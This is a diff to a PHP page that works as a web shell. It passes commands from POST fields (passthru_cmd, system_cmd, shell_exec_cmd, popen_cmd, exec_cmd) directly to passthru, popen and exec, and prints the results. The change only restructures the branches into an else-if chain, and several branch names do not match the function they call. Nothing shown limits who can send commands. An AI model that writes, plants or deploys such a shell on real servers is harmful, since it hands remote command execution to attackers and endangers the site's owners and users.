@@ -38,34 +38,22 @@
 
     <pre style="white-space: pre-line;">
         <?php
+
         if (isset($_POST['passthru_cmd'])) {
             passthru($_POST['passthru_cmd']);
-        }
-
-        if (isset($_POST['system_cmd'])) {
+        } else if (isset($_POST['system_cmd'])) {
             passthru($_POST['system_cmd']);
-        }
-
-        if (isset($_POST['shell_exec_cmd'])) {
+        } else if (isset($_POST['shell_exec_cmd'])) {
             passthru($_POST['shell_exec_cmd']);
-        }
-
-        if (isset($_POST['popen_cmd'])) {
+        } else if (isset($_POST['popen_cmd'])) {
             //start command and output console
-            while (@ ob_end_flush()); // end all output buffers if any
             $proc = popen($_POST['popen_cmd'], 'r');
-            echo '<pre>';
-            while (!feof($proc))
-            {
+            while (!feof($proc)) {
                 echo fread($proc, 4096);
                 @ flush();
             }
             pclose($proc);
-            echo '</pre>';
-            echo '</body>';
-        }
-
-        if (isset($_POST['exec_cmd'])) {
+        } else if (isset($_POST['exec_cmd'])) {
             exec($_POST['exec_cmd'], $out);
             print_r($out);
         }
